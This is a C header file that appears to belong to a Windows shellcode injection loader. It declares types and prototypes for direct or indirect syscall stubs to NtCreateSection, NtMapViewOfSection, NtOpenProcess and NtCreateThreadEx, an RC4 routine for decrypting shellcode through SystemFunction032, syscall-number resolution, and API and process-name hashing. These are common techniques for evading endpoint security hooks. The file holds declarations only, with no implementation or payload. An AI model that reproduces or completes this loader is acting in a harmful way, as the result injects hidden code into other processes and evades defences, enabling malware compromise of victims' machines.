#pragma once

#include <Windows.h>
#include <stdio.h>




#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
//#define //(msg, ...) //("[+] " msg "\n", ##__VA_ARGS__);
//#define //(msg, ...) //("[*] " msg "\n", ##__VA_ARGS__);
//#define //(msg, ...) //("[!] " msg "\n", ##__VA_ARGS__);


typedef struct {
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;
} USTRING;

// declare the function prototype
typedef NTSTATUS(NTAPI* fnSystemFunction032) (
	struct USTRING* data,
	struct USTRING* key
	);


typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;



typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	PVOID RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;




extern NTSTATUS p_NtCreateSection(
	_Out_          PHANDLE            SectionHandle,
	_In_           ACCESS_MASK        DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PLARGE_INTEGER     MaximumSize,
	_In_           ULONG              SectionPageProtection,
	_In_           ULONG              AllocationAttributes,
	_In_opt_ HANDLE             FileHandle
);

extern  NTSTATUS p_NtMapViewOfSection(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);


extern NTSTATUS p_NtOpenPro(
	_Out_         PHANDLE            ProcessHandle,
	_In_          ACCESS_MASK        DesiredAccess,
	_In_           POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PCLIENT_ID         ClientId
	);

extern NTSTATUS p_NtCreateThreadEx(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
	);




BOOL rcEnc(IN PBYTE pRc4Key, IN PBYTE pShellcode, IN DWORD dwRc4KeySize, IN DWORD sShellSize);
VOID inSsN(IN HMODULE hNTDLL, IN DWORD Funchsh, OUT DWORD* SSN, OUT UINT_PTR* SYSCALL);
BOOL pNQue(IN LPCWSTR szProcName, IN DWORD hsh, OUT DWORD* pdwPid);
FARPROC CProc(IN HMODULE module, IN DWORD hsh);
UINT32 hshA(IN PCHAR str);
PVOID _memcpy(PVOID dest, PVOID src, SIZE_T size);
